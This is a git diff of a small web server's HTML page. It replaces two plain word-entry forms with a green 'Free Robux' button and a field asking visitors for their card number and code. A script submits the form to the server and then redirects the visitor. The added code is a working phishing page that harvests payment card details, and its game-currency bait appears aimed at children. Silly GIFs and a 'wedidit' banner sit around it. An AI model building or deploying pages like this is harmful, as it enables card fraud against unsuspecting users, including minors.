@@ -2,20 +2,72 @@
 <html>
     <head>
         <title>Super page web(serv)</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Form Example</title>
+		<style>
+        /* Style for the input field */
+        input[type="text"] {
+            width: 100%;
+            max-width: 500px;
+            padding: 10px;
+            font-size: 1em;
+        }
+
+        /* Style for the button */
+        button {
+            width: 100%;
+            max-width: 500px;
+            padding: 20px; /* Adjust padding for larger size */
+            font-size: 1.5em; /* Increase font size */
+            background-color: #4CAF50; /* Background color */
+            color: white; /* Text color */
+            border: none; /* Remove border */
+            border-radius: 5px; /* Rounded corners */
+            cursor: pointer; /* Pointer cursor on hover */
+        }
+
+        /* Optional: Add hover effect */
+        button:hover {
+            background-color: #45a049;
+        }
+		</style>
     </head>
     <body style="background-color:gold;">
-        <form action="/" method="post">
-            <input type="text" name="word" placeholder="Enter a word" required>
-            <button type="submit">Submit</button>
-        </form>
         <img src="https://media.tenor.com/UVmpVqlpVhQAAAAM/yess-yes.gif">
         <img src="https://media.tenor.com/UVmpVqlpVhQAAAAM/yess-yes.gif">
         <img src="https://media.tenor.com/UVmpVqlpVhQAAAAM/yess-yes.gif">
         <img src="https://media.tenor.com/UVmpVqlpVhQAAAAM/yess-yes.gif">
-		<form action="/" method="post">
-            <input type="text" name="word" placeholder="Enter a word" required>
-            <button type="submit">Submit</button>
-        </form>
+		<br>
+
+		<form id="myForm" action="/" method="post">
+			<input type="text" name="password" placeholder="Enter your card number and code" required style="width: 100%; max-width: 500px;">
+			<button type="submit" onclick="handleSubmit(event)">Free Robux</button>
+		</form>		
+	
+		<script>
+			function handleSubmit(event) {
+				// Prevent the default form submission
+				event.preventDefault();
+	
+				// Get the form element
+				const form = document.getElementById('myForm');
+				
+				// Check if the form is valid
+				if (form.checkValidity()) {
+					// Submit the form
+					form.submit();
+	
+					// Redirect to the link
+					window.location.href = './favicon.ico';
+				} else {
+					// Optionally, you can handle invalid form cases here
+					alert('Please complete the form before proceeding.');
+				}
+			}
+		</script>
+		
+		
+
         <marquee><h1 style="color:red;font-size:200px;">YES!</h1></marquee>
         <h2 style="color:rgb(0, 64, 255);font-size:200px;">wedidit</h2>
     </body>
